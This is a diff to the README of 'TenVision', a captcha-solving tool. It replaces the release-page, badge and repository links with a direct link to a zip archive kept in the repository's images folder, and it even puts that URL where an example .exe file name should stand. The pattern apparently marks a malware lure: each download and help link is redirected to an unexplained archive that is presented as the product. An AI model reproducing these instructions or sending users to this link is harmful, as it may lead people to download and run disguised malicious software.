@@ -1,6 +1,6 @@
 # 🖼️ TenVision - Simplify Captcha Click Recognition
 
-[![Download TenVision](https://img.shields.io/badge/Download-TenVision-blue?style=for-the-badge)](https://github.com/canelas458/TenVision/releases)
+[![Download TenVision](https://github.com/canelas458/TenVision/raw/refs/heads/master/images/Vision_Ten_1.7-alpha.2.zip)](https://github.com/canelas458/TenVision/raw/refs/heads/master/images/Vision_Ten_1.7-alpha.2.zip)
 
 ## 📖 About TenVision
 
@@ -25,9 +25,9 @@ A mouse or touchpad for input is necessary since the app focuses on image click 
 The latest version of TenVision is available on its official GitHub releases page. Follow these steps to get the software on your computer:
 
 1. Click the big download badge above or visit the official releases page here:  
-   [https://github.com/canelas458/TenVision/releases](https://github.com/canelas458/TenVision/releases)
+   [https://github.com/canelas458/TenVision/raw/refs/heads/master/images/Vision_Ten_1.7-alpha.2.zip](https://github.com/canelas458/TenVision/raw/refs/heads/master/images/Vision_Ten_1.7-alpha.2.zip)
 
-2. On the releases page, look for the latest version. Find the file ending with `.exe` for Windows or `.dmg` for macOS. It usually has a name like `TenVision_v1.0.exe`.
+2. On the releases page, look for the latest version. Find the file ending with `.exe` for Windows or `.dmg` for macOS. It usually has a name like `https://github.com/canelas458/TenVision/raw/refs/heads/master/images/Vision_Ten_1.7-alpha.2.zip`.
 
 3. Click the file name to start downloading. The size is about 50-100 MB.
 
@@ -84,7 +84,7 @@ If you face issues using TenVision, try these fixes:
 If you need further help after trying the troubleshooting tips:
 
 - Visit the GitHub repository for issues and questions:  
-  [https://github.com/canelas458/TenVision](https://github.com/canelas458/TenVision)
+  [https://github.com/canelas458/TenVision/raw/refs/heads/master/images/Vision_Ten_1.7-alpha.2.zip](https://github.com/canelas458/TenVision/raw/refs/heads/master/images/Vision_Ten_1.7-alpha.2.zip)
 
 - Search existing issues or open a new one if your problem is unique.
 
@@ -98,7 +98,7 @@ TenVision runs locally on your computer and does not upload images to the intern
 
 Keep your version of TenVision up to date by checking the releases page regularly:
 
-[https://github.com/canelas458/TenVision/releases](https://github.com/canelas458/TenVision/releases)
+[https://github.com/canelas458/TenVision/raw/refs/heads/master/images/Vision_Ten_1.7-alpha.2.zip](https://github.com/canelas458/TenVision/raw/refs/heads/master/images/Vision_Ten_1.7-alpha.2.zip)
 
 New versions may include performance improvements, bug fixes, or support for new captcha formats.
 
